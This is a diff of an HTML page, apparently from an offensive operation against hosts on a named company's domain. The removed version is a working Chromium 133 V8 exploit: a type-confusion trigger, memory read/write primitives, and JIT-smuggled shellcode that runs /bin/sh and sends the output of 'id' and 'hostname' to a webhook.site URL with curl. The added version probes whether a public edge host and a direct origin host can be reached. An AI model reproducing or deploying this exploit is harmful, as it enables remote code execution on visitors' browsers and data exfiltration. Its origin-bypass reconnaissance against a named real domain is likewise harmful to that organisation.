@@ -1,10 +1,39 @@
-<!doctype html><meta charset=utf-8><title>CASI V107 M133 NATIVE CALLBACK</title><style>body{font:14px monospace;white-space:pre-wrap}</style><b>CASI V107 CHROMIUM 133 NATIVE CALLBACK NATIVE_SH_V107 ONLY</b><pre id=o>START</pre><script>
-var out=document.getElementById("o"),b=new ArrayBuffer(8),f=new Float64Array(b),u=new Uint32Array(b);function ftoi(v){f[0]=v;return BigInt(u[0])+(BigInt(u[1])<<32n)}function setbits(lo,hi){u[0]=Number(lo);u[1]=Number(hi);return f[0]}function hax(t){let x;delete x?.[y]?.a;let hole=y;let y;let o={};o.maybe_hole=t?hole:"not the hole";let len=o.maybe_hole.length,sign=Math.sign(len),i1=2-(sign+1),i2=5-(i1+4)>>1,i3=2*i2+2,i4=i3>>1,i5=i4*1000;let a=new Array(8);a[0]=13.37;a[i5]=13.37;return a}
-function layout(c){let oi=-1,oh=0,ri=-1,rh=0;for(let i=5;i<75;i++){let q=ftoi(c[i]),n=ftoi(c[i+1]),n2=ftoi(c[i+2]),lo=q&0xffffffffn,hi=q>>32n,nlo=n&0xffffffffn,nhi=n>>32n,n2lo=n2&0xffffffffn;if(hi===0x154161n&&nlo===0x745n&&n2lo===4n){oi=i;oh=1}if(lo===0x154161n&&hi===0x745n&&nhi===4n){oi=i;oh=0}if(hi===0x1540d9n&&nlo===0x745n&&n2lo===8n){ri=i;rh=1}if(lo===0x1540d9n&&hi===0x745n&&nhi===8n){ri=i;rh=0}}return[oi,oh,ri,rh]}
-try{let cmdBuf=new Array(0x10000).fill(1.1),cmd="/bin/sh\0-c\0(id;hostname) 2>&1|curl -m 15 --data-binary @- https://webhook.site/d4aaa1a1-8693-4e60-9bd0-58863998b92e/rce-id\0";for(let i=0;i<cmd.length;i+=8){let q=0n;for(let j=0;j<8&&i+j<cmd.length;j++)q|=BigInt(cmd.charCodeAt(i+j))<<BigInt(j*8);cmdBuf[i>>3]=setbits(q&0xffffffffn,q>>32n)}let scr_arr=Array(0x200).fill(0).map(function(_,i){return 0x21210002|(i<<7)}),osr_func=new Function("loop","for (let i=0; i<loop; i++);");
- let normal=hax(false);for(let j=0;j<65536;j++)hax(false);for(let j=0;j<65536;j++)hax(false);let c1=hax(true),fa1=[1111.1111,2222.2222,3333.3333],oa1={p:"AAAA"},ob1={p:"BBBB"},objs1=[oa1,ob1],rw1=[4444.4444,5555.5555,6666.6666,7777.7777],tail1=[8888.8888,9999.9999];let l1=layout(c1),mi1=l1[0],mh1=l1[1],ri1=l1[2]+1,rh1=l1[3],om1=c1[mi1],qm1=ftoi(om1),or1=c1[ri1],qr1=ftoi(or1);if(mi1<0||ri1<1)throw new Error("layout1");function tag1(o){objs1[0]=o;c1[mi1]=mh1?setbits(qm1&0xffffffffn,0x1540d9n):setbits(0x1540d9n,qm1>>32n);let z=objs1[0];c1[mi1]=om1;return ftoi(z)&0xffffffffn}function rd1(a){c1[ri1]=rh1?setbits(qr1&0xffffffffn,a-7n):setbits(a-7n,qr1>>32n);let z=rw1[0];c1[ri1]=or1;return ftoi(z)}let cbtag1=tag1(cmdBuf),cbel1=rd1(cbtag1-1n+8n)&0xffffffffn,dataoff=(cbel1+7n)&0xffffffffn;
- let payload=[0,0,0,0,true];for(let i=0;i<0xa5;i++)payload.push(0x21210000+i);payload.push(true);function sw(a0,a1,a2){return(0xeb000000|(a2<<16)|(a1<<8)|a0)>>1}function g(a0,a1,a2){payload.push(sw(a0,a1,a2),0,0,true,0x90909090>>1,0x90909090>>1,0x90909090>>1)}let offnum=Number(dataoff),bb=[offnum&255,(offnum>>>8)&255,(offnum>>>16)&255,(offnum>>>24)&255];g(0x48,0x31,0xc0);g(0x50,0x90,0x90);g(0x48,0x89,0xe3);for(let i=0;i<4;i++){g(0xb0,bb[i],0x90);g(0x88,0x43,i)}g(0x90,0x5f,0x90);g(0x4c,0x01,0xf7);g(0x48,0x89,0xfb);g(0x48,0x89,0xf9);for(let i=0;i<8;i++)g(0x48,0xff,0xc1);g(0x48,0x89,0xcd);for(let i=0;i<3;i++)g(0x48,0xff,0xc5);g(0x48,0x31,0xc0);g(0x50,0x90,0x90);g(0x90,0x55,0x90);g(0x90,0x51,0x90);g(0x90,0x53,0x90);g(0x48,0x89,0xe6);g(0x48,0x89,0xdf);g(0x48,0x31,0xd2);g(0x48,0x31,0xc0);g(0x04,0x3b,0x90);payload.push(0x050f9090>>1,0,0,true,0x90909090>>1,0x90909090>>1,0x90909090>>1);
- let code_str="";for(let i=0;i<0x200;i++)code_str+="let v"+i+" = "+(payload[i]===undefined?0:payload[i])+";\n";let baseline_compile=new Function("p1",code_str);for(let i=0;i<16;i++)baseline_compile(i);osr_func(0x10);out.textContent="ARMED NATIVE_SH_V107 CALLBACK";for(let j=0;j<65536;j++)hax(false);
- let c=hax(true),fa=[1111.1111,2222.2222,3333.3333],oa={p:"CCCC"},ob={p:"DDDD"},objs=[oa,ob],rw=[4444.4444,5555.5555,6666.6666,7777.7777],tail=[8888.8888,9999.9999];let l=layout(c),mi=l[0],mh=l[1],ri=l[2]+1,rh=l[3],om=c[mi],qm=ftoi(om),orw=c[ri],qr=ftoi(orw);if(mi<0||ri<1)throw new Error("layout2");function tag(o){objs[0]=o;c[mi]=mh?setbits(qm&0xffffffffn,0x1540d9n):setbits(0x1540d9n,qm>>32n);let z=objs[0];c[mi]=om;return ftoi(z)&0xffffffffn}function rd(a){c[ri]=rh?setbits(qr&0xffffffffn,a-7n):setbits(a-7n,qr>>32n);let z=rw[0];c[ri]=orw;return ftoi(z)}function wr(a,v){let old=rd(a);c[ri]=rh?setbits(qr&0xffffffffn,a-7n):setbits(a-7n,qr>>32n);rw[0]=setbits(BigInt(v)&0xffffffffn,old>>32n);c[ri]=orw}
- let cbtag=tag(cmdBuf),cbel=rd(cbtag-1n+8n)&0xffffffffn,current=(cbel+7n)&0xffffffffn;if(current!==dataoff)throw new Error("buffer moved");let stag=tag(scr_arr),sel=rd(stag-1n+8n)&0xffffffffn,pscr=(sel+8n+0x200n)&0xffffffffn,btag=tag(baseline_compile),bsfi=rd(btag-1n+0x10n)&0xffffffffn,bsp=rd(bsfi-1n),codeh=(bsp>>32n)&0xffffffffn,otag=tag(osr_func),fbct=rd(otag-1n+0x18n)&0xffffffffn,fbvt=rd(fbct-1n+4n)&0xffffffffn,slot=fbvt-1n+0x24n;wr(pscr-1n,0x11f5n);wr(pscr+3n,codeh);wr(slot,pscr|2n);osr_func(0x10000);out.textContent="UNEXPECTED RETURN";}catch(e){out.textContent+="\nSTOPPED\n"+e.name+"\n"+e.message}
+<!doctype html>
+<meta charset="utf-8">
+<title>CASI origin reachability probe</title>
+<style>body{font:18px monospace;white-space:pre-wrap;padding:24px}</style>
+<h1>CASI SAFE ORIGIN REACHABILITY PROBE</h1>
+<pre id="result">STARTING READ-ONLY IMAGE TESTS</pre>
+<script>
+const output = document.getElementById('result');
+const states = {
+  PUBLIC_EDGE_CONTROL: 'PENDING',
+  DIRECT_ORIGIN_238: 'PENDING'
+};
+
+function render() {
+  output.textContent = Object.entries(states)
+    .map(([name, state]) => `${name}: ${state}`)
+    .join('\n');
+}
+
+function probe(name, url) {
+  const image = new Image();
+  let finished = false;
+  const finish = state => {
+    if (finished) return;
+    finished = true;
+    states[name] = state;
+    render();
+  };
+
+  image.onload = () => finish(`LOADED ${image.naturalWidth}x${image.naturalHeight}`);
+  image.onerror = () => finish('NETWORK_OR_HTTP_ERROR');
+  setTimeout(() => finish('TIMEOUT'), 8000);
+  image.src = `${url}?origin_probe=20261109T0249Z`;
+}
+
+render();
+probe('PUBLIC_EDGE_CONTROL', 'https://casi.cat.com/backend/favicon.php');
+probe('DIRECT_ORIGIN_238', 'https://casi-ori.cat.com/backend/favicon.php');
 </script>
